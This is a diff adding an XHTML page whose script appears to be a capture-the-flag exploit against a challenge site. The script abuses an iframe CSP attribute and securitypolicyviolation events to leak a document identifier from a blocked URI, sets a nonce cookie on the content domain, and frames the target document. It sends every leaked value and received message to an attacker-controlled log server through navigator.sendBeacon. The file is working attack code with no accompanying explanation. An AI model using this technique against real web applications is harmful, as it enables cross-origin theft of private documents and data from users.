@@ -1,0 +1,41 @@
+<div xmlns="http://www.w3.org/1999/xhtml">
+  <iframe></iframe>
+  <iframe></iframe>
+  <iframe></iframe>
+  <iframe></iframe>
+  <script>
+      const iframes = [document.all[1], document.all[2], document.all[3], document.all[4]]
+
+      const file_to_leak = 'https://chall.secdriven.dev/file?id=133711377731'
+      const doc_url = '$DOC_URL';
+      const nonce = '$NONCE';
+      const log_server = '$LOG_SERVER'
+
+      navigator.sendBeacon(log_server, 'visit=start')
+      function recvOrigin(e) {
+          docId = e.blockedURI.match(/doc-\d+-\d+/)[0]
+          console.log(docId)
+          navigator.sendBeacon(log_server, docId)
+      }
+
+      function leak_origin() {
+          iframes[0].csp = 'frame-src https://chall.secdriven.dev'
+          iframes[0].srcdoc = `\x3ch1>123\x3c/h1>\x3ciframe src="${encodeURI(file_to_leak)}">\x3c/iframe>\x3cscript>document.addEventListener("securitypolicyviolation",parent.recvOrigin)\x3c/script>`;
+      }
+
+      function loadDocUrl() {
+          let l = new URL(doc_url)
+          l.searchParams.append('preview', 1);
+          document.cookie = `nonce=${nonce};Path=${l.pathname};Domain=.secdrivencontent.dev`
+          iframes[1].src = l
+      }
+
+      onmessage = e => {
+        navigator.sendBeacon(log_server, e.data);
+        console.log(e.data);
+      };
+
+      if(!doc_url.startsWith('$')) loadDocUrl()
+      else leak_origin()
+  </script>
+</div>
